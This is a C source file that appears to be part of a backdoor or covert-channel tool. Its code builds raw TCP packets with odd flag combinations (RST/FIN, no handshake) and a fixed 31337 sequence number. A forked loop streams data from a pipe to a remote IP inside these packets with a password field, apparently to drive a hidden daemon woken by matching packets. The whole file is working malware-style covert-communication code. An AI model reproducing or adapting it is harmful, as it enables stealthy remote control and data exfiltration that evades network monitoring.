#include <config.h>
#include <actions.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>

#include "raw.h"

// TODO: convert this file to a library
void send_raw(unsigned long ip, short sport, short dport, unsigned char *buf, size_t size, int rst) {
    short pig_ack=0;
    char *datagram = malloc(sizeof(struct tcphdr) + 12 + size);
    struct tcphdr *tcph = (struct tcphdr *) (datagram);
    struct sockaddr_in servaddr;
    memset(datagram, 0, sizeof(struct tcphdr) + 12 + size); /* zero out the buffer */

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = ip;

    tcph->source = htons(sport); /* source port */
    tcph->dest = htons(dport); /* destination port */
    tcph->seq = htonl(31337);
    tcph->ack_seq = htonl(pig_ack);/* in first SYN packet, ACK is not present */
    tcph->doff = 7+2+1 ;
    tcph->urg = 0;
    tcph->ack = 0;
    tcph->psh = 0;
    tcph->rst = rst;
    tcph->syn = 0;
    tcph->fin = 1;
    tcph->window = htons(57344); /* FreeBSD uses this value too */
    tcph->check = 0; /* we will compute it later */
    tcph->urg_ptr = 0;

    memcpy(&datagram[sizeof(struct tcphdr) + 12], buf, size);
    if (sendto (s, datagram, sizeof(struct tcphdr) + 12 + sizeof(struct data) ,0, (struct sockaddr *) &servaddr, sizeof (servaddr)) < 0) {
        //fprintf(stderr,"Error in sendto\n");
    }
    close(s);
    free(datagram);
}

int fill_raw_connection(struct rawsock *r, unsigned  char *buf, int size) {
    if (!r->initialized) return 0;

    //printf("Escrivint dades a la pipe pertinent\n");
    return write(r->r[1], buf, size);
}

// TODO: Falta parar aquest servei, i permetre més d'un servei d'aquests alhora.
int swapd_raw(struct rawsock *r, unsigned long ip, short sport, short dport, char *pass) {
    if (!r->initialized) return 0;
//    r->used = 1;
    int size = sizeof(struct tcphdr) + 12 + sizeof(struct data);
    unsigned char datagram[size];
    struct tcphdr *tcph = (struct tcphdr *) (datagram);
    struct sockaddr_in servaddr;
    memset(datagram, 0, size); /* zero out the buffer */

    int pid = fork();
    if (!pid) {
        int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
        servaddr.sin_family = AF_INET;
        servaddr.sin_addr.s_addr = ip;
        tcph->source = htons(sport);
        tcph->dest = htons(dport);
        tcph->seq = htonl(31337);
        tcph->ack_seq = htonl(0);
        tcph->doff = 7+2+1 ;
        tcph->urg = 0;
        tcph->ack = 0;
        tcph->psh = 0;
        tcph->rst = 1;
        tcph->syn = 0;
        tcph->fin = 0;
        tcph->window = htons(57344);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        struct data cmdpkt;
        cmdpkt.port = sport;
        
        // Si envio el packet igual que el què espero, em salta raw_daemon
        memcpy(cmdpkt.pass, pass, strlen(pass));

        //printf("[%d] launching on port: %d => %d\n",getpid(), sport, dport);
        while (1) {
            fd_set fds;
            int count;
            unsigned char buf[BUFSIZE];

            // put the fd to watch
            FD_ZERO(&fds);
            FD_SET(r->w[0], &fds);

            // there are data on pipe?
            if (select(r->w[0]  + 1, &fds, NULL, NULL, NULL) < 0 && (errno != EINTR)) break;

            // if there ara data, send it throw raw packet
            if (FD_ISSET(r->w[0], &fds)) {
                count = read(r->w[0], buf, BUFSIZE);
                //printf("Enviant %d bytes al client\n", count);
                cmdpkt.size = count;
                memcpy(cmdpkt.bytes, buf, count);
                memcpy(&datagram[sizeof(struct tcphdr) + 12], &cmdpkt, sizeof(struct data));
                sendto (s, datagram, size, 0, (struct sockaddr *) &servaddr, sizeof (servaddr));
            }
        }
        //printf("Exiting\n", sport, dport);
        close(s);
    } else {
        //printf("directraw: retuning pid\n");
        return pid;
    }
    return 0;
}

